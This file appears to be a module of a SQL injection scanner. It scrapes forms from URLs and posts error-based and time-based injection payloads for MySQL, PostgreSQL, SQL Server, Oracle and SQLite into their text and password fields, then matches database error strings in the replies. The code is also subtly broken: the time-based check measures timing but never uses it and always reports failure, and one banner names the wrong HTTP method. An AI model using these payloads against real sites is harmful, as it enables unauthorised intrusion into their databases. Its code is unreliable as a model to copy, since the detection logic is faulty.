from utils.ainsi import *
from utils.objects.vuln_link import *

import requests
from bs4 import BeautifulSoup
from utils.conf import *

db_error_signatures = {
        "MySQL": ["mysql_fetch_array", "warning: mysql", "supplied argument is not a valid mysql result", "mysql error", "you have an error in your sql syntax"],
        "PostgreSQL": ["postgresql error", "pg_query", "syntax error at or near", "error: syntax error"],
        "SQL Server": ["microsoft odbc driver for sql server", "sqlstate", "unclosed quotation mark", "incorrect syntax near", "sql server"],
        "Oracle": ["ora-00933", "ora-01722", "oracle error"],
        "SQLite": ["sqlite error", "near \"select\": syntax error"]
    }

time_based_payloads = {
        "MySQL": "' AND SLEEP(5)--",
        "PostgreSQL": "' AND pg_sleep(5)--",
        "SQL Server": "'; WAITFOR DELAY '0:0:5'--",
        "Oracle": "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)--"
    }

error_based_db_payloads = {
        "MySQL": ["' AND 1=CONVERT(int,(SELECT @@version))--", "' AND 1=BENCHMARK(1000000,MD5(1))--"],
        "PostgreSQL": ["' AND 1=(SELECT CAST(version() AS INT))--", "' AND 1=CAST((SELECT version()) AS INT)--"],
        "SQL Server": ["' AND 1=CONVERT(int,(SELECT @@version))--", "'; SELECT CAST(@@version AS INT);--"],
        "Oracle": ["' AND 1=(SELECT TO_NUMBER('a') FROM DUAL)--", "' AND 1=UTL_INADDR.GET_HOST_ADDRESS(('a'))--"],
        "SQLite": ["' AND 1=ABS(CAST(SQLITE_VERSION() AS INTEGER))--"]
    }  

def error_based_injection_post(url):
    for db_type, payloads in error_based_db_payloads.items():
            for payload in payloads:
                
                response = requests.get(url)
                soup = BeautifulSoup(response.text, 'html.parser')
                inputs = soup.find_all('input')
                input_data = {}
                for i, input in enumerate(inputs):
                    if "input" in str(input) and ('type="password"' in str(input) or 'type="text"' in str(input)):
                        if i == 0:
                            input_data[input.get('name', f'input_{i}')] = payload
                        else:
                            input_data[input.get('name', f'input_{i}')] = "pass"
                    
                # print(input_data)
                response = requests.post(url, data=input_data)
                response_text_lower = response.text.lower()
                
                
                for signature in db_error_signatures.get(db_type, []):
                    if signature in response_text_lower:
                        return True, db_type, "error-based"
    return False, None, None

import time
def time_based_injection_post(url):
    for db_type, payload in time_based_payloads.items():
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        inputs = soup.find_all('input')
        input_data = {}
        for i, input in enumerate(inputs):
            if "input" in str(input) and ('type="password"' in str(input) or 'type="text"' in str(input)):
                if i == 0:
                    input_data[input.get('name', f'input_{i}')] = payload
                else:
                    input_data[input.get('name', f'input_{i}')] = "pass"
        try:          
            start_time = time.time()   
            response = requests.post(url, data=input_data)
            end_time = time.time()
            
        except requests.exceptions.RequestException as e:
            pass
        except Exception as e:
            print(f"    Une erreur inattendue s'est produite: {e}")
    return False, None, None

def check_sql_injection_post(url):
    success = False
    db_type = None
    detection = None

    success, db_type, detection = time_based_injection_post(url)
    if success == False:
        success, db_type, detection = error_based_injection_post(url)            
    if success:
        print(f"{colored('🟡 Detection:', YELLOW, styles=BOLD)} {colored(url, GREEN, styles=BLINK)} > {colored(db_type, MAGENTA, styles=BOLD)}")
        return success, db_type, detection  

    print(f"{colored('🟡 Detection:', YELLOW, styles=BOLD)} {colored(url, RED, styles=STRIKETHROUGH)}")
    return success, db_type, detection  
    

def identify_db_post(scrapped_data):
    print(f"🔴 {colored('Detection:', RED, styles=BOLD)} {colored('GET Method', CYAN, styles=BOLD)}")
    success = False
    identified_db = None    
    vuln_links = set()
    
    for url in scrapped_data:        
        try:
            response = requests.get(url, timeout=10)
            
            response.raise_for_status()
        except requests.exceptions.RequestException as e:
            print(f"Erreur lors de la requête originale : {e}")
            return 
        
        success, db_type, detection = check_sql_injection_post(url)
        if success:
            vuln_links.add(vuln_link(db_type, url, None, success))
        time.sleep(requested_delay)
        
    print(erase_lines(len(scrapped_data) + 3))
    if len(vuln_links) < 1:
        print(f"{colored('🔴 Detection:', WHITE, styles=BOLD)} {colored(url, GREEN, styles=BLINK)} > {colored('Cannot find database', RED, styles=BOLD)}")
        
    for vuln_link_obj in vuln_links:
        url, identified_db, query_params, success = vuln_link_obj.get_infos()
        print(f"{colored('🟢 Detection:', WHITE, styles=BOLD)} {colored(url, GREEN, styles=BLINK)} > {colored(identified_db, MAGENTA, styles=BOLD)} - {colored(detection, CYAN, styles=BOLD)}")
    print()
    return vuln_links